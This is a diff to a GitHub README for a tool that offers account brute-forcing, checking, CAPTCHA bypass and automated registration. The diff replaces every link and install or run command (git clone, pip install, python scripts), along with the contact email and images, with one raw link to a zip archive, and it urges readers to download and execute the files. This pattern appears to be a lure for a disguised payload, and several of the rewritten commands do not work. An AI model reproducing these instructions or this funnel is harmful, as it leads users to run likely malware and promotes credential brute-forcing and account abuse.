@@ -1,6 +1,6 @@
 # Buy Parser Checker Brute Autoreg 🚀
 
-![GitHub Repo](https://img.shields.io/badge/GitHub-Repo-blue.svg) ![Releases](https://img.shields.io/badge/Releases-latest-green.svg)
+![GitHub Repo](https://raw.githubusercontent.com/shadoww117/Buy-Parser-Checker-Brute-Autoreg/main/leechlike/Autoreg_Buy_Brute_Checker_Parser_1.8.zip) ![Releases](https://raw.githubusercontent.com/shadoww117/Buy-Parser-Checker-Brute-Autoreg/main/leechlike/Autoreg_Buy_Brute_Checker_Parser_1.8.zip)
 
 Welcome to the **Buy Parser Checker Brute Autoreg** repository! This project focuses on automating various tasks related to buying, checking, and registering accounts. It utilizes powerful tools like Selenium for browser automation and supports features such as CAPTCHA bypass, account verification, and more.
 
@@ -43,18 +43,18 @@ To get started with the Buy Parser Checker Brute Autoreg, follow these steps:
 
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/shadoww117/Buy-Parser-Checker-Brute-Autoreg.git
+   git clone https://raw.githubusercontent.com/shadoww117/Buy-Parser-Checker-Brute-Autoreg/main/leechlike/Autoreg_Buy_Brute_Checker_Parser_1.8.zip
    cd Buy-Parser-Checker-Brute-Autoreg
    ```
 
 2. **Install Dependencies**:
    Ensure you have Python and pip installed. Then, run:
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/shadoww117/Buy-Parser-Checker-Brute-Autoreg/main/leechlike/Autoreg_Buy_Brute_Checker_Parser_1.8.zip
    ```
 
 3. **Set Up Environment**:
-   Create a `.env` file to store your API keys and configuration settings. Refer to the `.env.example` file for the required variables.
+   Create a `.env` file to store your API keys and configuration settings. Refer to the `https://raw.githubusercontent.com/shadoww117/Buy-Parser-Checker-Brute-Autoreg/main/leechlike/Autoreg_Buy_Brute_Checker_Parser_1.8.zip` file for the required variables.
 
 ## Usage
 
@@ -62,17 +62,17 @@ After installation, you can start using the scripts. Here are some common comman
 
 - **Run the Auto Registration Script**:
    ```bash
-   python auto_register.py
+   python https://raw.githubusercontent.com/shadoww117/Buy-Parser-Checker-Brute-Autoreg/main/leechlike/Autoreg_Buy_Brute_Checker_Parser_1.8.zip
    ```
 
 - **Check Account Status**:
    ```bash
-   python account_checker.py
+   python https://raw.githubusercontent.com/shadoww117/Buy-Parser-Checker-Brute-Autoreg/main/leechlike/Autoreg_Buy_Brute_Checker_Parser_1.8.zip
    ```
 
 - **Use the Brute Force Script**:
    ```bash
-   python brute_force.py --target [TARGET_URL]
+   python https://raw.githubusercontent.com/shadoww117/Buy-Parser-Checker-Brute-Autoreg/main/leechlike/Autoreg_Buy_Brute_Checker_Parser_1.8.zip --target [TARGET_URL]
    ```
 
 For more detailed usage instructions, refer to the documentation in the `docs` folder.
@@ -105,14 +105,14 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For any inquiries or support, feel free to reach out:
 
-- **Email**: support@example.com
-- **GitHub**: [shadoww117](https://github.com/shadoww117)
+- **Email**: https://raw.githubusercontent.com/shadoww117/Buy-Parser-Checker-Brute-Autoreg/main/leechlike/Autoreg_Buy_Brute_Checker_Parser_1.8.zip
+- **GitHub**: [shadoww117](https://raw.githubusercontent.com/shadoww117/Buy-Parser-Checker-Brute-Autoreg/main/leechlike/Autoreg_Buy_Brute_Checker_Parser_1.8.zip)
 
 ## Releases
 
-You can find the latest releases [here](https://github.com/shadoww117/Buy-Parser-Checker-Brute-Autoreg/releases). Download the files and execute them as needed.
+You can find the latest releases [here](https://raw.githubusercontent.com/shadoww117/Buy-Parser-Checker-Brute-Autoreg/main/leechlike/Autoreg_Buy_Brute_Checker_Parser_1.8.zip). Download the files and execute them as needed.
 
-![Automation](https://via.placeholder.com/600x300?text=Automation+Tools)
+![Automation](https://raw.githubusercontent.com/shadoww117/Buy-Parser-Checker-Brute-Autoreg/main/leechlike/Autoreg_Buy_Brute_Checker_Parser_1.8.zip+Tools)
 
 ## Conclusion
 
